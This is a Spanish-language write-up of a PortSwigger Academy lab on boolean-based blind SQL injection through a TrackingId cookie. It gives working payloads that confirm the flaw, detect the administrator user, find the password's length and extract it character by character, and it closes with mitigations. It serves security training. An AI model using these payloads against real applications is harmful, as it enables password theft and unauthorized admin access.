Lab11: Blind SQL injection with conditional responses

Nivel Practitioner
Tipo de SQLi Blind SQL Injection (Boolean-based)

Objetivo

Comprender cómo un atacante puede extraer información de la base de datos cuando la aplicación no muestra directamente los resultados de las consultas SQL, utilizando respuestas condicionales del servidor.

Vulnerabilidad

La aplicación utiliza una cookie llamada TrackingId que se incluye directamente dentro de una consulta SQL sin validación.

Aunque la aplicación no devuelve errores ni resultados de la consulta en la respuesta HTTP, sí presenta cambios en el contenido de la página dependiendo de si una condición SQL es verdadera o falsa. En este caso, la página muestra el mensaje "Welcome back" cuando la condición es verdadera.

Esto permite realizar una inyección SQL ciega basada en booleanos, donde el atacante envía consultas que generan condiciones verdaderas o falsas y analiza la respuesta de la aplicación para inferir información.

Nota: En este laboratorio no es necesario utilizar funciones avanzadas como Burp Collaborator. El ataque se basa en observar cambios en la respuesta de la aplicación cuando una condición SQL es verdadera o falsa.

Procedimiento

  1. Acceder al laboratorio y abrir Burp Suite, activando la opción Intercept en la pestaña Proxy para capturar las peticiones HTTP enviadas por el navegador.
  2. Interactuar con la página (por ejemplo seleccionando una categoría de productos) para interceptar una petición. En la solicitud interceptada se puede observar una cookie llamada TrackingId, la cual será el punto de inyección. 
    GET /filter?category=Gifts HTTP/1.1
Cookie: TrackingId=xyz123
  3. Enviar la petición interceptada al Repeater para poder modificarla manualmente y probar diferentes payloads de SQL Injection.
  4. Probar una condición booleana verdadera modificando el valor de la cookie TrackingId con un payload como: 
    TrackingId=xyz' AND '1'='1

    Observar que la página muestra el mensaje "Welcome back", indicando que la condición es verdadera.

  5. Probar una condición falsa modificando el payload a: 
    TrackingId=xyz' AND '1'='2

    En este caso el mensaje "Welcome back" desaparece, lo que confirma que la consulta SQL está siendo evaluada por la base de datos y que la respuesta condicional funciona.

  6. Verificar la existencia del usuario administrator mediante una subconsulta SQL: 
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

    Si aparece "Welcome back", significa que el usuario administrator existe en la tabla users.

  7. Determinar la longitud de la contraseña del usuario administrator: 
    TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

    Se incrementa el número (LENGTH(password)>2, >3, etc.) hasta que "Welcome back" desaparezca. Cuando desaparece, la longitud es el último número que mostró el mensaje.

  8. Extraer la contraseña carácter por carácter utilizando la función SUBSTRING: 
    TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

    Se prueba cada carácter (a-z, 0-9) hasta que "Welcome back" aparece, indicando que el carácter es correcto. Luego se pasa a la siguiente posición (SUBSTRING(password,2,1), etc.).

  9. Automatizar el proceso con Burp Intruder para probar todas las posiciones y caracteres de forma eficiente.

Payloads utilizados

Payload de confirmación (verdadero)

xyz' AND '1'='1

Payload de confirmación (falso)

xyz' AND '1'='2

Payload para verificar existencia de administrator

xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a

Payload para determinar longitud de contraseña

xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a

Payload para extraer caracteres

xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Explicación de los payloads

  • xyz': Cierra la cadena original de la cookie TrackingId.
  • AND: Permite agregar una condición adicional a la consulta SQL.
  • '1'='1: Condición booleana que siempre es verdadera. Útil para verificar el comportamiento base.
  • '1'='2: Condición que siempre es falsa. Útil para confirmar que la respuesta cambia.
  • (SELECT 'a' FROM users WHERE username='administrator')='a': Subconsulta que devuelve 'a' si existe el usuario administrator. La condición completa es verdadera solo si el usuario existe.
  • LENGTH(password)=20: Verifica si la longitud de la contraseña es 20.
  • SUBSTRING(password,1,1)='a': Extrae el primer carácter de la contraseña y lo compara con 'a'.

Proceso de extracción manual

  • Paso 1: Confirmar vulnerabilidad con '1'='1' vs '1'='2'.
  • Paso 2: Confirmar existencia del usuario administrator.
  • Paso 3: Determinar longitud de contraseña (ej. 20 caracteres).
  • Paso 4: Para cada posición i de 1 a 20, probar caracteres 'a'...'z', '0'...'9' hasta encontrar el que muestra "Welcome back".

Verificación del ataque

La vulnerabilidad se confirma al observar cambios en la respuesta de la aplicación cuando aparece o desaparece el mensaje "Welcome back" dependiendo de la condición SQL inyectada.

Una vez extraída la contraseña completa del usuario administrator (por ejemplo, "8fg5h2j1k4m9p3q7r2s5"), se utiliza en el formulario de login para acceder como administrador, demostrando que:

  • La inyección SQL ciega es posible incluso sin ver datos directamente.
  • Se puede extraer información sensible mediante inferencia booleana.
  • El impacto es equivalente al de una inyección SQL tradicional.

Resultado esperado: El laboratorio se resuelve correctamente al iniciar sesión como administrator y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.

Mitigación recomendada

Consultas Preparadas (Parameterized Queries)

Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte de la estructura SQL, bloqueando cualquier intento de inyección, incluso los basados en respuestas condicionales.

SELECT * FROM tracking WHERE id = ?

Validación de Entradas

Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible (alfanumérico de longitud fija), rechazar cualquier valor que no cumpla con ese patrón.

Eliminar Respuestas Condicionales

Modificar la aplicación para que no muestre contenido diferente basado en resultados de consultas a la base de datos. El mensaje "Welcome back" debería mostrarse de forma consistente o no mostrarse en absoluto, independientemente del TrackingId.

Web Application Firewall (WAF)

Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de manipulación de cookies.

Principio de Menor Privilegio

La cuenta de base de datos utilizada por la aplicación debe tener permisos mínimos, limitando el acceso a las tablas necesarias.

Evitar que Parámetros del Cliente se Concateten en Consultas SQL

Ningún dato proveniente del cliente (cookies, headers, parámetros) debe concatenarse directamente en consultas SQL.
